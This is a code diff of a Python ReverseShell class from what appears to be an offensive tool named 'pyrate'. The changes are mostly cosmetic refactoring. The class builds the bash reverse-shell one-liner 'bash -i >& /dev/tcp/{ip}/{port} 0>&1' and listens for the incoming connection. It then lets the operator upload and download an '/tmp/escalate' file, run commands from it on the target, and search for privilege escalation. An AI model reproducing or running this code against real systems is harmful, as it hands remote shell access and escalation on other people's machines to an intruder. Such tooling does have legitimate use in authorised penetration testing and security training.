@@ -1,15 +1,17 @@
-from listener import PortListener
-from cli import CLI
-from file_transfer import FileTransfer
-from privilege_escalation import PrivilegeEscalation
+# @author dotPY-hax
+# @author Vsevolod Ivanov
 
+from pyrate.listener import PortListener
+from pyrate.cli import CLI
+from pyrate.file_transfer import FileTransfer
+from pyrate.privilege_escalation import PrivilegeEscalation
 
 class ReverseShell:
     def __init__(self, host_ip, host_port, target_ip):
         self.host_ip = host_ip
         self.host_port = host_port
         self.target_ip = target_ip
-        self.simple_reverse_shell_bash = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=host_ip, port=host_port)
+        self.simple_reverse_shell_bash = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=host_ip, port=host_port)
         self.cli = CLI()
         self.cli.cli_print(self.simple_reverse_shell_bash)
         self.listener = PortListener(host_ip, host_port)
@@ -30,22 +32,22 @@ class ReverseShell:
         return return_value
 
     def handle_command(self, command):
-        if command.lower() in ["bye"]:
+        if command.lower() in ['bye']:
             self.running = False
-            return ""
-        if command.lower() == "runfile":
-            self.commands_from_local_file("/tmp/escalate")
-            return ""
-        if command.lower() == "fileupload":
-            self.send_file("/tmp/escalate", "/tmp/escalate")
-            return ""
-        if command.lower() == "filedownload":
-            self.receive_file("/tmp/escalate", "/tmp/escalate")
-            return ""
-        if command.lower() == "privesc":
+            return ''
+        if command.lower() == 'runfile':
+            self.commands_from_local_file('/tmp/escalate')
+            return ''
+        if command.lower() == 'fileupload':
+            self.send_file('/tmp/escalate', '/tmp/escalate')
+            return ''
+        if command.lower() == 'filedownload':
+            self.receive_file('/tmp/escalate', '/tmp/escalate')
+            return ''
+        if command.lower() == 'privesc':
             self.search_for_privesc()
-            return ""
-        return command + "\n"
+            return ''
+        return command + '\n'
 
     def run(self):
         self.handle_initial_data()
@@ -53,7 +55,7 @@ class ReverseShell:
             self.main_loop()
 
     def commands_from_local_file(self, local_file):
-        with open(local_file, "r") as run_this:
+        with open(local_file, 'r') as run_this:
             for line in run_this.readlines():
                 return_value = self.listener.send_receive(line)
                 self.cli.cli_print(return_value)
